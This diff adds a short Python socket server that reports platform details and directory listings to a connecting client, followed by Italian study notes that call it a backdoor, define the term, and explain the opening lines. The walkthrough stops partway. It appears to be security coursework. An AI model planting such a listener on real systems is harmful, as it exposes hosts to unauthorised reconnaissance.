@@ -1,0 +1,62 @@
+import socket, platform, os
+SRV_ADDR = ""
+SRV_PORT = 1234
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind((SRV_ADDR, SRV_PORT))
+s.listen(1)
+connection, address = s.accept()
+
+print("client connnected: ", address)
+
+while 1:
+    try:
+        data = connection.recv(1024)
+    except:continue
+
+    if(data.decode('utf-8') == '1'):
+        tosend = platform.platform() + " " + platform.machine()
+        connection.sendall(tosend.encode())
+    elif(data.decode('utf-8') == '2'):
+        data = connection.recv(1024)
+        try:
+            filelist = os.listdir(data.decode('utf-8'))
+            tosend = ""
+            for x in filelist:
+                tosend += "," + x
+        except:
+            tosend = "Wrong path"
+        connection.sendall(tosend.encode())
+    elif(data.decode('utf-8') == '0'):
+        connection.close()
+        connection, address = s.accept()
+
+Questo codice fa riferimento a una backdoor
+Per descrivere questo codice è necessario spiegare che cos'è una backdoor:
+Una backdoor è letteralmente una porta di servizio, serve ad aggirare e/o bypassare il normale sistema di autenticazione.
+Le backdoor sono impostate direttamente nel codice del software stesso, installate successivamente oppure di tipo hardware.
+
+Questo codice è un programma che permette di scambiare i pacchetti  tra due computer, una sorgente ed un desinatario.
+Svolge lo stesso compito di un server, su uno specifico indirizzo ip e porta.
+
+
+import socket, platform, os          
+SRV_ADDR = ""
+SRV_PORT = 1234
+
+Nelle prime righe viene importato il modulo socket che fornisce funzionalità per la comunicazione 
+di rete in python, l'indirizzo ip da utilizzare e la rispettiva porta 
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind((SRV_ADDR, SRV_PORT))
+s.listen(1)
+connection, address = s.accept()
+print("client connnected: ", address)
+
+Qui viene creato il socket, nella prima riga viene esplicitato il tipp di IP (IPv4) e il tipo di protocollo (TCP)
+nella seconda riga viene associato l'IP alla porta specificata e nella terza riga mette il socket in modalità ascolto in base al parametro.
+La quarta riga accetta la connessione in entrata specificando l'indirizzo e la porta del client.
+L'ultima riga stampa un messaggio per la corretta connessione.
+
+
+
